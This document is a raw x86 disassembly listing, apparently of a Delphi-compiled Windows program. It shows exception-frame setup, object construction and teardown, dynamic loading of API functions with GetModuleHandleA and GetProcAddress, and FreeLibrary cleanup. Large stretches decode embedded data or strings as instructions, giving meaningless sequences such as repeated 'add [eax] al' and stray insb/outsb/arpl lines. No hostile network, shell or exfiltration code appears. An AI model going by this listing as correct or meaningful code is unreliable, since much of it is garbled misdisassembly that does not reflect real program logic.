je r-xdata
movlps [ ecx + 0x45 ] xmm1
js r-xdata
add bh bh
dec [ ebx + 0x424d18c0 ]
add [ edi ] cl
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4259ff
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
or [ eax + 0x65 ] ecx
insb
jns r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
insb
jo r-xdata
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
dec ebp
inc edx
add bh bh
call [ ebp + ecx * 2 + 0x42 ]
lodsd [ esi ]
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0x4cd87265
adc ecx [ ecx + 0x45 ]
insd
adc al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc edx
jo r-xdata
outsb
dec eax
insb
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403ea8
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
inc eax
outsb
je r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x4d147265
inc edx
add [ ecx ] al
xchg bx ax
cld
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
jmp r-xdata
int3
mov eax eax
xor [ eax ] al
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bl
dec esp
imul ebp [ edi + 0x6e ] 0x7800408d
dec esi
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4e ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc00424e ] cl
add [ eax ] al
add [ eax + 0x4c004010 ] ah
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
jae r-xdata
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
adc al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
outsb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425a06
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4048dc
lea eax [ ebp - 0x8 ]
call sub_4054f4
retn
inc ebx
xor edi edi
lea eax [ eax ]
adc al 0x4e
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x4e140040 ]
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c60
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405538
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
outsd
outsb
je r-xdata
jne r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
add bh bh
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424264
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40550c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405538
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
jae r-xdata
dec [ ebx + 0x424ca8c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
sub_425030
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4250a6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4251bc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40550c
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4250ad
lea eax [ ebp - 0x8 ]
call sub_4054f4
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425148
mov [ rw-data ] eax
sub_4250b4
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_425148
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405538
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42510c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40550c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_425148
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030d4
mov dl 0x1
mov eax [ r-xdata ]
call sub_424228
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424228
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424228
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403e54
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_4251bc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4252bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42510c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424278
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4054f4
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d088
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4054f4
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d088
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42510c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424278
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42510c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424278
mov ecx r-xdata
call sub_405538
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4252c4
lea eax [ ebp - 0xc ]
call sub_4054f4
lea eax [ ebp - 0x8 ]
call sub_4054f4
retn
sub edx 0xfffffff8
sub_4252dc
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_424264
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42531c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_424264
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42534c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4254de
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_424264
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425479
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4254e5
lea eax [ ebp - 0x10 ]
call sub_403e54
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_424264
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
mov eax esi
xor edx edx
call sub_424264
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_424264
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403104
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_424264
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_4254ec
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4255d1
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403ea8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4255d8
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4048dc
lea eax [ ebp - 0x8 ]
call sub_4054f4
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_424264
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40550c
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405538
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_424264
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40550c
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405538
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_425808
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4258fb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403ea8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425902
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4048dc
lea eax [ ebp - 0x10 ]
call sub_4054f4
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405538
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_424264
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_40550c
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405538
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_425920
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4259ff
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403ea8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425a06
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4048dc
lea eax [ ebp - 0x8 ]
call sub_4054f4
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405538
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424264
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40550c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405538
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_425a20
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405568
xor eax eax
push ebp
push sub_425a6f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_40550c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425a76
lea eax [ ebx + 0xc ]
call sub_4054f4
sub_425a7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404304
xor eax eax
push ebp
push sub_425b11
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403ea8
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_425808
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b18
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax ebx
call sub_42531c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42534c
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4254ec
sub_425b3c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_424264
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_424264
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413c5c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_424264
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_413c5c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_413c5c
sub_425bc8
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax esi
call sub_4252dc
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403104
mov eax [ esi + 0x14 ]
call sub_403104
mov eax [ esi + 0x10 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4054f4
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_425c1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425c53
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c5a
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_425c64
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425c89
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c90
retn
sub_425c9c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425ccd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425cd4
retn
mov eax [ rw-data ]
call sub_403104
sub_425ce0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_425d14
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_425d3c
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
mov eax r-xdata
mov [ rw-data ] eax
sub_425fbe
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425fe5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425fec
retn
sub_426000
dec esp
pushad
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42 ] dl
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x4c004010 ]
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xf4004030
xor [ eax ] al
int3
sub_42604d
pushad
inc edx
add al dl
pushad
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x50 ] si
pushad
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004260 ] bh
add [ eax ] al
add [ eax ] al
pushad
inc edx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ ecx ] dl
inc edx
add [ ecx + 0x42 ] al
add [ eax + 0x61 ] dl
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_4260d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030d4
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_426114
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_42616c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426191
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426198
retn
sub_4261a4
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42615c
xor eax eax
push ebp
push sub_42635b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426362
mov eax [ rw-data ]
call sub_426164
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
